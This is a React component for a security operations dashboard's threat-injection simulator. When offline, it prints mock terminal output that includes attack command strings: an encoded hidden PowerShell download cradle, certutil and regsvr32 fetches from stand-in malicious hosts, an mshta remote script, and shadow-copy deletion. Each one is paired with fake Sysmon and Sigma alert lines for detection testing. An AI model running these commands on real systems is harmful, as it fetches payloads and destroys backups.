import React, { useState, useCallback } from 'react';
import { Terminal, Play, AlertCircle, RefreshCw, CheckCircle2, XCircle } from 'lucide-react';
import { simulationAttacks } from '../utils/mockData';
import { useSimulator } from '../hooks/useSimulator';
import type { SimulationAttack } from '../types';

export const Simulator: React.FC = () => {
  const { isRunning, result, error, runAttack } = useSimulator();
  const [activeSimulation, setActiveSimulation] = useState<SimulationAttack | null>(null);
  const [terminalOutput, setTerminalOutput] = useState<string[]>([
    'AI-SOC Threat Simulator CLI v2.1.0',
    'Ready for attack simulation injections. Select a trigger above.',
    ''
  ]);

  const handleRunSimulation = useCallback(async (attack: SimulationAttack) => {
    setActiveSimulation(attack);
    setTerminalOutput([
      `[SIMULATOR] Initiating simulation run: ${attack.name} (${attack.id})`,
      `[SIMULATOR] Connecting to backend at ${import.meta.env.VITE_API_URL || 'http://localhost:8000'}...`,
      `[SIMULATOR] Mapped technique: MITRE ${attack.technique} (${attack.tactic})`,
      `[PROCESS] Sending POST /simulate/${attack.id}...`,
    ]);

    const success = await runAttack(attack.id);

    if (success) {
      setTerminalOutput(prev => [
        ...prev,
        `[BACKEND] Simulation '${attack.id}' completed successfully.`,
        `[BACKEND] Re-running detection pipeline to capture new events...`,
        `[REFRESH] Dashboard and alerts updated with latest telemetry.`,
        '',
        `✓ Simulation completed. Threat telemetry generated successfully.`
      ]);
      // Global refresh handled automatically by useSimulator hook
    } else {
      setTerminalOutput(prev => [
        ...prev,
        `[ERROR] Simulation failed. Backend may be unavailable.`,
        `[FALLBACK] Running local dry-run simulation instead...`,
        `[PROCESS] Spawning agent thread...`,
      ]);
      // Fallback: show local terminal output
      runLocalSimulation(attack);
    }
  }, [runAttack]);

  const runLocalSimulation = (attack: SimulationAttack) => {
    const terminalScripts: Record<string, string[]> = {
      powershell: [
        'powershell.exe -nop -w hidden -enc JAB3AGMAYgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAGIALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAACkAOwA=',
        '[SYSMON] Event ID 1 (Process Create): ParentName=explorer.exe, Image=powershell.exe',
        '[ENGINE] Correlating Sysmon logs for WIN-DEV-04...',
        '[ALERT] rule_id=SIGMA-PS-ENCODED: Severity=CRITICAL (Confidence=95%)',
        '[SOAR] Playbook RANSOMWARE_CONTAIN initiated automatically',
        'Simulation completed. Threat telemetry generated successfully.'
      ],
      cmd: [
        'cmd.exe /c "explorer.exe -> cmd.exe spawn test"',
        '[SYSMON] Event ID 1 (Process Create): ParentName=explorer.exe, Image=cmd.exe',
        '[ENGINE] Correlating parent-child relationship anomalies...',
        '[ALERT] rule_id=SIGMA-CMD-SPAWN: Severity=MEDIUM (Confidence=85%)',
        'Simulation completed. Threat telemetry generated successfully.'
      ],
      certutil: [
        'certutil.exe -urlcache -f http://evil-server.net/payload.exe payload.exe',
        '[SYSMON] Event ID 1 (Process Create): Image=certutil.exe, CommandLine=-urlcache -f ...',
        '[SYSMON] Event ID 22 (DNS Query): QueryName=evil-server.net',
        '[ALERT] rule_id=SIGMA-CERTUTIL-DOWNLOAD: Severity=HIGH (Confidence=92%)',
        'Simulation completed. Threat telemetry generated successfully.'
      ],
      mshta: [
        'mshta.exe http://192.168.1.50/malicious.hta',
        '[SYSMON] Event ID 1 (Process Create): Image=mshta.exe, Command=http://192.168.1.50...',
        '[ALERT] rule_id=SIGMA-MSHTA-EXECUTION: Severity=HIGH (Confidence=90%)',
        'Simulation completed. Threat telemetry generated successfully.'
      ],
      rundll32: [
        'rundll32.exe shell32.dll,Control_RunDLL',
        '[SYSMON] Event ID 1 (Process Create): Image=rundll32.exe',
        '[ALERT] rule_id=SIGMA-RUNDLL32-PROXY: Severity=LOW (Confidence=70%)',
        'Simulation completed. Threat telemetry generated successfully.'
      ],
      regsvr32: [
        'regsvr32.exe /s /n /u /i:http://badsite.com/sc.sct scrobj.dll',
        '[SYSMON] Event ID 1 (Process Create): Image=regsvr32.exe, Params=/s /n /u /i...',
        '[ALERT] rule_id=SIGMA-REGSVR32-SCRIPLET: Severity=HIGH (Confidence=91%)',
        'Simulation completed. Threat telemetry generated successfully.'
      ],
      wmic: [
        'wmic.exe shadowcopy delete',
        '[SYSMON] Event ID 1 (Process Create): Image=wmic.exe, CommandLine=shadowcopy delete',
        '[ALERT] rule_id=SIGMA-SHADOW-DELETE: Severity=CRITICAL (Confidence=98%)',
        'Simulation completed. Threat telemetry generated successfully.'
      ]
    };

    const lines = terminalScripts[attack.id] || ['Executing command...', 'Done.'];
    let step = 0;
    const interval = setInterval(() => {
      if (step < lines.length) {
        setTerminalOutput(prev => [...prev, lines[step]]);
        step++;
      } else {
        clearInterval(interval);
      }
    }, 500);
  };

  // Show result/error toast in terminal
  React.useEffect(() => {
    if (result) {
      setTerminalOutput(prev => [...prev, `[BACKEND] ${result.message}`]);
    }
    if (error) {
      setTerminalOutput(prev => [...prev, `[ERROR] ${error}`]);
    }
  }, [result, error]);

  return (
    <div className="space-y-6 text-left animate-fade-in">
      {/* Title */}
      <div>
        <h1 className="text-2xl font-bold tracking-tight text-white">Threat Injection Simulator</h1>
        <p className="text-sm text-soc-muted mt-1.5">
          Validate EDR alert correlation rules by triggering harmless mock attack chains on local telemetry endpoints.
        </p>
      </div>

      {/* Simulator Notice */}
      <div className="bg-amber-950/10 border border-amber-900/30 text-amber-400/90 rounded-xl p-4 flex items-start space-x-3">
        <AlertCircle className="h-5 w-5 flex-shrink-0 mt-0.5" />
        <div className="text-xs leading-relaxed">
          <span className="font-bold">Backend Integration:</span> When the backend is available, attacks trigger{' '}
          <code className="text-amber-300 bg-amber-950/30 px-1 py-0.5 rounded">POST /simulate/{'{attack}'}</code>.
          After a successful simulation, dashboard and alerts refresh automatically. When offline, dry-run mode is used.
        </div>
      </div>

      {/* Attacks Grid Selection */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {simulationAttacks.map((attack) => {
          const isSelected = activeSimulation?.id === attack.id;
          const isCurrentlyRunning = isRunning && isSelected;
          return (
            <div 
              key={attack.id}
              className={`card-premium p-5 flex flex-col justify-between space-y-4 ${
                isSelected ? 'border-soc-accent/40 bg-soc-accent/5 shadow-glow' : ''
              } ${result && isSelected ? 'border-soc-low/40' : ''} ${error && isSelected ? 'border-soc-critical/40' : ''}`}
            >
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-mono font-bold text-soc-muted bg-soc-bg/60 px-2 py-0.5 border border-soc-border/30 rounded">
                    {attack.technique}
                  </span>
                  <span className="text-[10px] font-semibold text-soc-accent uppercase tracking-wider">
                    {attack.tactic}
                  </span>
                </div>
                <h3 className="font-bold text-white text-sm">{attack.name}</h3>
                <p className="text-xs text-soc-muted leading-relaxed">{attack.description}</p>
              </div>

              <button
                disabled={isRunning && !isSelected}
                onClick={() => handleRunSimulation(attack)}
                className={`w-full inline-flex items-center justify-center space-x-2 py-2.5 rounded-xl text-xs font-semibold border transition-all duration-200 ${
                  isCurrentlyRunning 
                    ? 'bg-soc-bg/60 border-soc-border/30 text-soc-muted/50 cursor-not-allowed'
                    : 'bg-soc-bg/60 border-soc-accent/30 text-soc-accent hover:bg-soc-accent hover:text-white hover:border-soc-accent hover:shadow-glow'
                }`}
              >
                {isCurrentlyRunning ? (
                  <>
                    <RefreshCw className="h-3.5 w-3.5 animate-spin" />
                    <span>Executing...</span>
                  </>
                ) : result && isSelected && result.status === 'success' ? (
                  <>
                    <CheckCircle2 className="h-3.5 w-3.5 text-soc-low" />
                    <span className="text-soc-low">Completed</span>
                  </>
                ) : error && isSelected ? (
                  <>
                    <XCircle className="h-3.5 w-3.5 text-soc-critical" />
                    <span className="text-soc-critical">Failed</span>
                  </>
                ) : (
                  <>
                    <Play className="h-3.5 w-3.5" />
                    <span>Run Simulation</span>
                  </>
                )}
              </button>
            </div>
          );
        })}
      </div>

      {/* Terminal Output */}
      <div className="bg-soc-bg/80 border border-soc-border/60 rounded-xl overflow-hidden flex flex-col shadow-card">
        <div className="bg-soc-surface border-b border-soc-border/40 px-5 py-2.5 flex items-center justify-between">
          <div className="flex items-center space-x-2.5 text-xs">
            <div className="bg-soc-accent/10 p-1.5 rounded-lg">
              <Terminal className="h-4 w-4 text-soc-accent" />
            </div>
            <span className="font-mono text-soc-muted">Injected Process Output Console</span>
          </div>
          <div className="flex items-center space-x-1.5">
            <span className="w-2.5 h-2.5 rounded-full bg-soc-critical/60"></span>
            <span className="w-2.5 h-2.5 rounded-full bg-soc-medium/60"></span>
            <span className="w-2.5 h-2.5 rounded-full bg-soc-low/60"></span>
          </div>
        </div>
        
        {/* Terminal log text area */}
        <div className="flex-1 p-4 font-mono text-xs text-soc-text/80 overflow-y-auto space-y-1 selection:bg-soc-accent/30 scroll-smooth min-h-[280px] max-h-[320px]">
          {terminalOutput.map((line, idx) => {
            let colorClass = 'text-soc-text/80';
            if (line.includes('[SIMULATOR]')) colorClass = 'text-soc-accent font-semibold';
            else if (line.includes('[ALERT]')) colorClass = 'text-soc-critical font-bold';
            else if (line.includes('[SOAR]')) colorClass = 'text-soc-high font-bold';
            else if (line.includes('[SYSMON]')) colorClass = 'text-soc-info';
            else if (line.includes('[BACKEND]')) colorClass = 'text-soc-accent font-semibold';
            else if (line.includes('[ERROR]')) colorClass = 'text-soc-critical font-bold';
            else if (line.includes('completed') || line.includes('success')) colorClass = 'text-soc-low font-bold';
            else if (line.includes('failed')) colorClass = 'text-soc-critical font-bold';

            return (
              <div key={idx} className={colorClass}>
                {line.startsWith('[') ? '' : '> '}{line}
              </div>
            );
          })}
          {isRunning && (
            <div className="flex items-center space-x-2 text-soc-accent font-semibold mt-2">
              <span className="w-1.5 h-3.5 bg-soc-accent animate-pulse rounded-sm"></span>
              <span className="text-[10px] animate-pulse-soft">Processing...</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Simulator;
